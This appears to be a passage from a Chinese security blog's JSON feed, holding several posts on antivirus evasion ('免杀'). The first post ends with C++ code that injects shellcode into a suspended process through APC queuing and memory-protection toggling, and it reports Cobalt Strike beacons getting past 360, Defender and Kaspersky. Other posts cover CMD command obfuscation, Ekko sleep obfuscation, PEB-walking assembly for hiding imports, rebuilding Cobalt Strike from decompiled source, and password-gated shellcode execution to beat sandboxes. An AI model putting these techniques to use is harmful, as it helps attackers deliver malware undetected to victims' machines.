class=\"line\">\t<span class=\"built_in\">MyVirProtect</span>(lpBaseeAddresss, <span class=\"keyword\">sizeof</span> fish, PAGE_READWRITE, &amp;oldProtect);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">777</span>; i++);</span><br><span class=\"line\">\t<span class=\"built_in\">MyVirProtect</span>(lpBaseeAddresss, <span class=\"keyword\">sizeof</span> fish, PAGE_NOACCESS, &amp;oldProtect);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">321</span>; i++);</span><br><span class=\"line\">\t<span class=\"built_in\">MyVirProtect</span>(lpBaseeAddresss, <span class=\"keyword\">sizeof</span> fish, PAGE_READWRITE, &amp;oldProtect);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">123</span>; i++);</span><br><span class=\"line\">\t<span class=\"built_in\">MyVirProtect</span>(lpBaseeAddresss, <span class=\"keyword\">sizeof</span> fish, PAGE_NOACCESS, &amp;oldProtect);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">256</span>; i++);</span><br><span class=\"line\">\t<span class=\"built_in\">MyVirProtect</span>(lpBaseeAddresss, <span class=\"keyword\">sizeof</span> fish, PAGE_EXECUTE_READ, &amp;oldProtect);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">Sleep</span>(<span class=\"number\">15000</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">MyWriteMen</span>(pi.hProcess, lpBaseeAddresss, (LPVOID)fish, <span class=\"built_in\">sizeof</span>(fish), <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">MyQueueAPC</span>((PAPCFUNC)lpBaseeAddresss, pi.hThread, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">ResumeThread</span>(pi.hThread);</span><br><span class=\"line\">\t<span class=\"built_in\">CloseHandle</span>(pi.hThread);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//工具生成的junkCode进行填充，太长了就不写了</span></span><br></pre></td></tr></table></figure><br />\n 编译完后还可以进一步操作，比如替换 ico 图标，添加伪签名等等。这里我只进行图标的替换测试了 360 (核晶模式)、windowDefinder (个人版、企业版、专业版)、卡巴斯基 (免费版)，其中除了 wdf 专业版无法上线之外其他都能做到无感上线，并且可以直接执行 shell 命令 (当然这里我用的是 cs4.9 并且配置了 C2profile 有一定的流量规避效果)。</p>\n<p><strong>360 核晶</strong>：<img data-src=\"https://dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hrpqnl0tgyj31c00u0gs7.jpg\" alt=\"\" /><br />\n<strong>wdf (真实环境远程上线 ==&gt; 执行 screenshot)</strong>：<img data-src=\"https://dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hrpqr5hiihj316c0pi7an.jpg\" alt=\"\" /><br />\n<strong>卡巴斯基</strong>：<img data-src=\"https://dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hrpqnosm7hj31u70u0dqa.jpg\" alt=\"\" /><br />\n<strong>360 杀毒 + 360 核晶会报警告提示</strong></p>\n<h5 id=\"ekko睡眠混淆技术演示\"><a class=\"anchor\" href=\"#ekko睡眠混淆技术演示\">#</a> Ekko 睡眠混淆技术演示：</h5>\n<p>该项目也是 havoC2 的作者的，已经集成在了 havoc 上，在这我们单独把这个项目运行看看，将 github 上的项目拉取到本地即可，编译器用的是 visual studio2022。其混淆原理简单来说就是在一个周期内睡眠结束后的几十毫秒内将内存中代码段进行异或恢复到正常功能代码，并同时恢复 RX 属性。<br />\n我们需要关注的代码段就在 Ekko.c 中，这里我们单独提炼出来：<br />\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ImageBase = <span class=\"built_in\">GetModuleHandleA</span>(<span class=\"literal\">NULL</span>);     <span class=\"comment\">//获取当前进程基址</span></span><br><span class=\"line\"><span class=\"comment\">//获取该本进程内存镜像大小</span></span><br><span class=\"line\">PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)ImageBase;</span><br><span class=\"line\">DWORD e_lfanew = dosHeader-&gt;e_lfanew;</span><br><span class=\"line\">PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((<span class=\"type\">char</span>*)ImageBase + e_lfanew);</span><br><span class=\"line\">ImageSize = ntHeaders-&gt;OptionalHeader.SizeOfImage;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//ImageSize = 0x0005e6b4;</span></span><br></pre></td></tr></table></figure><br />\n 这里获取内存镜像大小的代码我做了修改，原项目的代码在我本地运行时获取到的大小始终为 0，暂时也不清楚什么情况。<br />\n这里我们修改完后再编译即可，这里我们使用 messagebox 来模拟 c2 服务端发送的指令，使用<strong> ProcessHacker</strong> 监控内存变换。</p>\n<p><em><strong>非睡眠时间段 (事件等待时间段)：</strong></em><br />\n<img data-src=\"https://dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hrpvp4d5wtj31cz0u0x05.jpg\" alt=\"\" /><br />\n<em><strong>睡眠混淆时间段：</strong></em><br />\n<img data-src=\"https://dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hrpvp7ovgyj31cu0u0aux.jpg\" alt=\"\" /></p>\n",
            "tags": [
                "免杀",
                "免杀"
            ]
        },
        {
            "id": "https://shut-td.github.io/CMD%E5%91%BD%E4%BB%A4%E6%B7%B7%E6%B7%86/",
            "url": "https://shut-td.github.io/CMD%E5%91%BD%E4%BB%A4%E6%B7%B7%E6%B7%86/",
            "title": "CMD命令混淆",
            "date_published": "2024-04-02T16:53:28.000Z",
            "content_html": "<h3 id=\"背景\"><a class=\"anchor\" href=\"#背景\">#</a> 背景</h3>\n<p>当我们获取 shell 或者连接到远控时，直接执行高危操作会被拦截因此需要做命令上的混淆来达到静态免杀的效果。</p>\n<h5 id=\"1-转义符号连接\"><a class=\"anchor\" href=\"#1-转义符号连接\">#</a> 1、转义符号连接</h5>\n<p>即在命令中通过填充  ^  该符号进行混淆<br />\n <figure class=\"highlight cos\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">w</span><span class=\"symbol\">^h</span><span class=\"symbol\">^o</span><span class=\"symbol\">^am</span><span class=\"symbol\">^i</span></span><br></pre></td></tr></table></figure><br />\n<img data-src=\"https://dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hoczg4gntcj30dk02pglk.jpg\" alt=\"\" /><br />\n<strong> 注意这里一次只能用一个 ^ 进行连接</strong></p>\n<h5 id=\"2-利用set设置变量并使用连续执行达到混淆效果\"><a class=\"anchor\" href=\"#2-利用set设置变量并使用连续执行达到混淆效果\">#</a> 2、利用 set 设置变量并使用 &amp;&amp; 连续执行达到混淆效果</h5>\n<p><figure class=\"highlight cos\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">set</span> gg=wh&amp;&amp;<span class=\"built_in\">%gg</span><span class=\"built_in\">%oami</span></span><br><span class=\"line\">再加上<span class=\"number\">1</span>的操作</span><br><span class=\"line\"><span class=\"keyword\">set</span> gg=<span class=\"keyword\">w</span><span class=\"symbol\">^h</span>^&amp;&amp;<span class=\"built_in\">%gg</span><span class=\"built_in\">%oa</span><span class=\"symbol\">^mi</span></span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hocznijn5cj30ei023weh.jpg\" alt=\"\" /></p>\n<p><img data-src=\"https://dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hocznwfke0j30fq02jdfu.jpg\" alt=\"\" /></p>\n<h5 id=\"3-双引号包裹\"><a class=\"anchor\" href=\"#3-双引号包裹\">#</a> 3、双引号包裹</h5>\n<p><figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;</span>wh<span class=\"string\">&quot;&quot;</span>o<span class=\"string\">&quot;ami&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;&quot;w&quot;&quot;&quot;</span><span class=\"string\">&quot;h^o&quot;</span><span class=\"string\">&quot;am^i</span></span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hoczp72g9fj30c202swef.jpg\" alt=\"\" /></p>\n<p><img data-src=\"https://dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hoczplami2j30dw02et8o.jpg\" alt=\"\" /></p>\n<h5 id=\"4-括号包裹\"><a class=\"anchor\" href=\"#4-括号包裹\">#</a> 4、括号包裹</h5>\n<p><figure class=\"highlight cos\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">((((((whoami))))))</span><br><span class=\"line\">混合有限只能中间和 ^ 配合</span><br><span class=\"line\">((((((<span class=\"keyword\">w</span><span class=\"symbol\">^h</span><span class=\"symbol\">^o</span><span class=\"symbol\">^a</span><span class=\"symbol\">^m</span><span class=\"symbol\">^i</span>))))))</span><br></pre></td></tr></table></figure><br />\n<img data-src=\"https://dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hoczqr3468j30ea02et8p.jpg\" alt=\"\" /></p>\n<p><img data-src=\"https://dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hoczr5q7d6j30fg02kt8q.jpg\" alt=\"\" /></p>\n<h5 id=\"5-unicode替换非通用\"><a class=\"anchor\" href=\"#5-unicode替换非通用\">#</a> 5、Unicode 替换 (非通用)</h5>\n<p>ʱ ʰ ʲ ʳ ʷ ʸ ˢ ˣ ˡ<br />\nʷ 修饰字母小写 W<br />\nʸ 修饰字母小写 Y<br />\nʰ 修饰字母小写 H<br />\nʱ 带钩的修饰字母小写 H<br />\nʲ 修饰字母小写 J<br />\nʳ 修饰字母小写 R<br />\nˡ 修饰字母小写 L<br />\nˢ 修饰字母小写 S<br />\nˣ 修饰字母小写 X<br />\n 这个不太行，适用性太窄</p>\n<p>这也是我突发奇想试了将近半个多小时试出来总结出来的，结果上网一查早就有大佬总结好了 (emo 了～) 贴个链接把 ==&gt; <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvbmV0d29yay8yOTEwMjAuaHRtbA==\">https://www.freebuf.com/articles/network/291020.html</span></p>\n",
            "tags": [
                "攻防技巧",
                "攻防技巧"
            ]
        },
        {
            "id": "https://shut-td.github.io/%E6%BA%90%E7%A0%81%E5%8F%8D%E7%BC%96%E8%AF%91%E5%8F%8A%E6%90%AD%E5%BB%BA%E9%97%AE%E9%A2%98-CS%E4%BA%8C%E5%BC%80%E7%B3%BB%E5%88%97/",
            "url": "https://shut-td.github.io/%E6%BA%90%E7%A0%81%E5%8F%8D%E7%BC%96%E8%AF%91%E5%8F%8A%E6%90%AD%E5%BB%BA%E9%97%AE%E9%A2%98-CS%E4%BA%8C%E5%BC%80%E7%B3%BB%E5%88%97/",
            "title": "源码反编译及搭建问题[CS二开系列]",
            "date_published": "2024-03-31T18:35:14.000Z",
            "content_html": "<h3 id=\"源码的反编译及搭建\"><a class=\"anchor\" href=\"#源码的反编译及搭建\">#</a> 源码的反编译及搭建</h3>\n<p>我这里使用的是 jadx 进行的反编译，因此后面会有一些代码上的坑需要注意一下。<br />\n新建如下图的目录结构，并将原始的 CSjar 包放进 cs_bin 即可。</p>\n<p><img data-src=\"https://dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hoaqyt5couj30me04874r.jpg\" alt=\"\" /></p>\n<p>使用 jadx 反编译完后导出为 graddle 项目至 cs_src 目录中即可获取源码即下图两个文件夹。</p>\n<p><img data-src=\"https://dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hoar1cl14pj30m8036mxd.jpg\" alt=\"\" /></p>\n<p>然后打开 IDEA 新建一个空项目并新建一个 decompiled_src 目录，并将 source 目录复制入 decompiled_src 即可，后续操作参考这篇<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzM3ODUzMy5odG1s\">二开搭建</span>的文章。</p>\n<p>在这里主要讲下可能是 jadx 反编译的问题导致的反编译后的源代码有些地方会出错需要手动更正一下，这里举几个例子：<br />\n<img data-src=\"https://dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hoar8i6pgnj30mv0a0wg6.jpg\" alt=\"\" /><br />\n这里报错的原型是这段代码：<br />\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (Map.Entry entry : <span class=\"built_in\">this</span>.hooks.entrySet())&#123;</span><br><span class=\"line\">\t.......</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br />\n 这里只需要跟进 <code>this.hooks.entrySet()</code>  观察一下返回的类型是什么即可，比如这里跟进之后发现是个 Set 集合，在外面用 Set 集合封装一下在替换即可解决报错，需要注意的是泛型要对齐，再比如下图也是这样。<br />\n<img data-src=\"https://dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hoar8n7oogj30m20553ze.jpg\" alt=\"\" /></p>\n<p>还有一种报错就是属性报错，跟进那个类里看一下最接近的属性是什么改成什么就行了，还有包括一些明显的逻辑上的错误比如从外面接了参数却使用另一个赋值为空的参数去比较：<br />\n<img data-src=\"https://dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hoarg84tvzj30xq09s3zo.jpg\" alt=\"\" /><br />\n错误原型为第二行多加了 <code>String text2 = &quot;&quot;</code> ，并在 <code>sum += text.charAt(x)</code>  这段代码变成了 <code>sum += text2.charAt(x)</code>  修正过来即可，反正这类逻辑上的代码问题还是稍微注意一下就行。</p>\n<p>至此环境基本搭建完成，可以启动 Agressor 端进行相关例如 UI 的修改以及相关功能的二开了</p>\n",
            "tags": [
                "安全工具开发",
                "安全工具开发"
            ]
        },
        {
            "id": "https://shut-td.github.io/%E8%87%AA%E6%88%91%E5%AE%9A%E4%BD%8D-%E6%9C%AA%E6%9D%A5%E5%B1%95%E6%9C%9B-To-Future/",
            "url": "https://shut-td.github.io/%E8%87%AA%E6%88%91%E5%AE%9A%E4%BD%8D-%E6%9C%AA%E6%9D%A5%E5%B1%95%E6%9C%9B-To-Future/",
            "title": "自我定位 & 未来展望 To Future~",
            "date_published": "2024-03-15T05:24:48.000Z",
            "content_html": "<h3 id=\"自我定位\"><a class=\"anchor\" href=\"#自我定位\">#</a> 自我定位</h3>\n<p>不多说上图<br />\n<img data-src=\"//dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hnrmbqbnrvj30q40q475r.jpg\" alt=\"\" /></p>\n<ul>\n<li>目前算是多方面发育吧，正在学习有关内核、驱动、逆向以及代审有关的知识。</li>\n<li>现在的想法主要还是朝着代码审计和安全开发走吧，目标暂时就是试着二开或者直接自研一整套 C2，审一审比较大的开源框架吧。</li>\n</ul>\n<h3 id=\"未来展望-to-future~\"><a class=\"anchor\" href=\"#未来展望-to-future~\">#</a> 未来展望 To Future~</h3>\n<p>可能更想去安全研究 / 实验室 / 攻防的岗位吧🙌</p>\n",
            "tags": []
        },
        {
            "id": "https://shut-td.github.io/%E6%84%8F%E5%A4%96%E7%9A%84Kernel32%E5%9F%BA%E5%9D%80%E5%AF%BB%E5%9D%80/",
            "url": "https://shut-td.github.io/%E6%84%8F%E5%A4%96%E7%9A%84Kernel32%E5%9F%BA%E5%9D%80%E5%AF%BB%E5%9D%80/",
            "title": "意外的Kernel32基址寻址",
            "date_published": "2024-03-15T03:03:18.000Z",
            "content_html": "<h3 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h3>\n<pre><code>在PE文件结构中有个十分重要的东西，也是杀软进行静态分析时常死盯着的，那就是我们的导入表(Import Directory)，内含了该文件运行时调用的DLL文件以及导出函数。\n</code></pre>\n<p><img data-src=\"//dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hnrid6mj92j31cx0tmgu8.jpg\" alt=\"\" /></p>\n<pre><code>如果我们编写脚本时使用Windows库内自带的API，那么这些DLL文件以及包含在内的导出函数便会一览无余得暴露出来，所以我们需要将这些都隐藏掉实现导入表隐藏。如何实现最重要的一步就是通过PEB找到我们的Kernel32基址。\n</code></pre>\n<h3 id=\"windbg调试中遇到的问题与解决\"><a class=\"anchor\" href=\"#windbg调试中遇到的问题与解决\">#</a> Windbg 调试中遇到的问题与解决</h3>\n<pre><code>Windbg的使用及安装教程网上资料很多就不多说了，主要提一下在调试时遇到的几个问题。\n1、在附加进程时出现错误，先尝试以管理员权限启动Windbg再附加，若仍然报错则直接File-&gt;Open Executable File直接启动任意一个可执行文件也是可以进行调试的，和附加是一样的。\n2、调试过程中发生错误 Symbol _PEB 不存在等等之类的，在符号搜索路径(Symbol File Path Search)中添加路径：SRV*c:\\mysymbol* http://msdl.microsoft.com/download/symbols 即可。\n3、查询至InloadOrderMudleList中的Flink，Blink双向链表时其地址为 ??? ，这是操作系统对内核数据结构的保护进行的隐藏，我分别在Win10，Win10(虚拟机)，Win11三台机器上操作发现只有Win10(虚拟机)进行了字段隐藏，只显示 ???，这个问题我也不知道怎么解决，看情况应该是只有虚拟机会出现，还望懂的大佬能帮一手。\n</code></pre>\n<p><img data-src=\"//dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hnriy3p62qj30pf0a4q3t.jpg\" alt=\"\" /></p>\n<p><img data-src=\"//dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hnrjm8yshdj30nq09y409.jpg\" alt=\"\" /></p>\n<h3 id=\"kernel32基址寻址的两条路线\"><a class=\"anchor\" href=\"#kernel32基址寻址的两条路线\">#</a> Kernel32 基址寻址的两条路线</h3>\n<pre><code>如何使用Windbg在PEB寻找到kernel32基址这里不展开说了有很多相关的文章可以看，这里主要的内容是我在调试寻址过程中发现的一些问题。\n第一条路线：这是最常见的一条即通过InloadOrderMudleList:Flink这条链一直往下跟就能找到Kernel32的DllBase，汇编代码：\n</code></pre>\n<p><figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">mov</span> <span class=\"built_in\">eax</span>, <span class=\"built_in\">fs</span>:[<span class=\"number\">0x30</span>]     //找PEB</span><br><span class=\"line\"><span class=\"keyword\">mov</span> <span class=\"built_in\">eax</span>, [<span class=\"built_in\">eax</span> + <span class=\"number\">0x0c</span>]  //获取Ldr</span><br><span class=\"line\"><span class=\"keyword\">mov</span> <span class=\"built_in\">eax</span>, [<span class=\"built_in\">eax</span> + <span class=\"number\">0x0c</span>]  //获取InloadOrderMudleList:Flink</span><br><span class=\"line\"><span class=\"keyword\">mov</span> <span class=\"built_in\">eax</span>, [<span class=\"built_in\">eax</span>]         //获取InloadOrderLinks:Flink =&gt; xxx<span class=\"number\">.</span>exe</span><br><span class=\"line\"><span class=\"keyword\">mov</span> <span class=\"built_in\">eax</span>, [<span class=\"built_in\">eax</span>]         //获取InloadOrderLinks:Flink =&gt; ntdll<span class=\"number\">.</span>dll</span><br><span class=\"line\"><span class=\"keyword\">mov</span> <span class=\"built_in\">eax</span>, [<span class=\"built_in\">eax</span> + <span class=\"number\">0x18</span>]  //获取kernel32 DLLBase也就是基地址</span><br><span class=\"line\"><span class=\"keyword\">mov</span> dwKernel32Addr, <span class=\"built_in\">eax</span></span><br></pre></td></tr></table></figure><br />\n 第二条路线：在最先开始研究的时候我以为这条路线就是第一条路线，但随着调试的过程中发现这地址不对啊！我还以为是操作系统造成的区别导致地址不一，但是我运行了这两段代码都成功指向同一个地址也就是我们的 Kernel32 的基址<br />\n <figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">mov</span> <span class=\"built_in\">eax</span>, <span class=\"built_in\">fs</span>: [<span class=\"number\">0x30</span>]      //找到PEB</span><br><span class=\"line\"><span class=\"keyword\">mov</span> <span class=\"built_in\">eax</span>, [<span class=\"built_in\">eax</span> + <span class=\"number\">0x0c</span>]    //找LDR</span><br><span class=\"line\"><span class=\"keyword\">mov</span> <span class=\"built_in\">eax</span>, [<span class=\"built_in\">eax</span> + <span class=\"number\">0x14</span>]    //InMemoryOrderModuleList:Flink</span><br><span class=\"line\"><span class=\"keyword\">mov</span> <span class=\"built_in\">eax</span>, [<span class=\"built_in\">eax</span>]           //InLoadOrderLinks:<span class=\"string\">&quot;shellcode.exe&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">mov</span> <span class=\"built_in\">eax</span>, [<span class=\"built_in\">eax</span>]           //InLoadOrderLinks:<span class=\"string\">&quot;ntdll.dll&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">mov</span> <span class=\"built_in\">eax</span>, [<span class=\"built_in\">eax</span> + <span class=\"number\">0x10</span>]    //InInitializationOrderLinks:Flink =&gt; DllBase<span class=\"string\">&quot;kernel32.dll&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">mov</span> dwKernel32Addr, <span class=\"built_in\">eax</span></span><br></pre></td></tr></table></figure><br />\n 仔细观察上述两段寻址汇编会发现除了获取 Ldr 内的 MudleList 不同和最后不同，其他找的步骤都是一样，那我们看看两条路线在 Windbg 中最后分别是什么<br />\n<img data-src=\"//dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hnrkh9hfh8j30yy07twgy.jpg\" alt=\"\" /></p>\n<p><img data-src=\"//dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hnrkhb2uquj30wn07vdhu.jpg\" alt=\"\" /></p>\n<pre><code>可以很明显看到这两个字段都指向了0x76fd0000，但是后面为什么InInitializationOrderLinks:Flink的地址就是Kernel32基址而不是DLLBase呢？根据网上众多资料收集来的信息来看可能是因为版本的原因造成的，其真正的基址需要在DllBase的地址上回滚8个字节(也就是图中从 0x18 ==&gt; 0x10)，所以才变成了Flink的地址。其中Ldr内三个模块都能找到Kernel32基址(除了上述两条还有InInitializationOrderModuleList)，只不过现在只有第一条路线是不需要回滚字节的。\n</code></pre>\n<p><img data-src=\"//dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hnrkqcctmbj30x30cftbx.jpg\" alt=\"\" /></p>\n<p><strong>至于要回滚字节的背后的底层原因我也不是很清楚，还请知道的大佬教教～～</strong></p>\n",
            "tags": [
                "Pwn",
                "Pwn"
            ]
        },
        {
            "id": "https://shut-td.github.io/%E7%BB%99EXE%E4%B8%8A%E9%94%81/",
            "url": "https://shut-td.github.io/%E7%BB%99EXE%E4%B8%8A%E9%94%81/",
            "title": "给EXE上锁",
            "date_published": "2024-03-14T10:15:25.000Z",
            "content_html": "<pre><code>在免杀中我们常常会用各种加密手段将shellcode进行变形以达到绕过杀软的静态检测分析，比如说最常见的异或，base64编码，aes，rsa，ecc等，当然静态查杀并不是我们主要要解决的，因为静态查杀是最容易绕过的基本上用异或就可以解决，今天我们的主题是绕过杀软的动态查杀。\n先说说我认为的杀软查杀恶意文件的方法吧，第一种就是静态查杀，只通过搜索其有无恶意软件的静态特征进行查杀，这种是最容易绕过的基本上对恶意代码进行简单的变形就可以绕过了；第二种就是动态查杀，即用一个沙箱去模拟执行你的文件看是否会执行到某些敏感操作上去；第三种是内存查杀和行为监控，这也是最为难绕过的，因为不管你shellcode在执行前是什么样的加载到内存中去就会现出原形从而被检查到，还有在你去执行命令时不可避免的会向外联地址发送数据，这其中的流量特征也是难以更改的因此很容易被捕捉到，这也就是有些我们可以上线但一执行命令就寄了的原因。\n好，简单叙述完查杀原因，我们来步入今天的主题，如何轻松绕过第二种查杀。首先也是最为重要的一点，那就是我们的exe文件后面是可以跟参数的，举个例子：\n</code></pre>\n<p><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;参数个数：%d&quot;</span>, argc);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;第几个参数：%s-%s&quot;</span>, argv[<span class=\"number\">0</span>], argv[<span class=\"number\">1</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">system</span>(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br />\n<img data-src=\"//dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hnqp2u9hz3j30vp0pjwfe.jpg\" alt=\"\" /></p>\n<p>可以看到输出的参数，其中 argc 是命令行中参数个数 (包括了这个文件名)，其中 argv 中存储的是命令行中所有的参数。</p>\n<p><img data-src=\"//dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hnqp2wjah4j30vn0plq4a.jpg\" alt=\"\" /></p>\n<p>既然可以跟参数取参数，那我们就可以像设置密码一样控制程序的流程，从而绕过某些检测机制。</p>\n<p><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">Hello</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Hello World&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">InjectShellcode</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Inject shellcode!!!&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (argc &gt;= <span class=\"number\">2</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ((std::string)argv[<span class=\"number\">1</span>] == <span class=\"string\">&quot;123456&quot;</span>) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">InjectShellcode</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">Hello</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span 